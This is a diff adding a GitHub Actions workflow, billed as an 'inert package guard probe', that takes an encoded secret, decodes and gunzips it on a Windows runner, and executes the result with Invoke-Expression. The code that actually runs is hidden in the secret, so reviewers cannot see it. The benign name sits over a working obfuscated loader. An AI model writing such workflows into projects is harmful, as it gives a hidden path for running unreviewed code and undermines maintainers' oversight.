@@ -1,0 +1,23 @@
+name: Hunter 0b6c Windows package guard
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  package_guard:
+    runs-on: windows-2025
+    timeout-minutes: 15
+    steps:
+      - name: Execute private inert package guard probe
+        shell: pwsh
+        env:
+          HUNTER_PROBE_GZB64: ${{ secrets.HUNTER_0B6C_L10_PROBE_GZB64 }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          if ([string]::IsNullOrWhiteSpace($env:HUNTER_PROBE_GZB64)) { throw 'Probe input unavailable' }
+          $bytes = [Convert]::FromBase64String($env:HUNTER_PROBE_GZB64)
+          $memory = [IO.MemoryStream]::new($bytes)
+          $gzip = [IO.Compression.GzipStream]::new($memory, [IO.Compression.CompressionMode]::Decompress)
+          $reader = [IO.StreamReader]::new($gzip)
+          $probe = $reader.ReadToEnd()
+          Invoke-Expression $probe
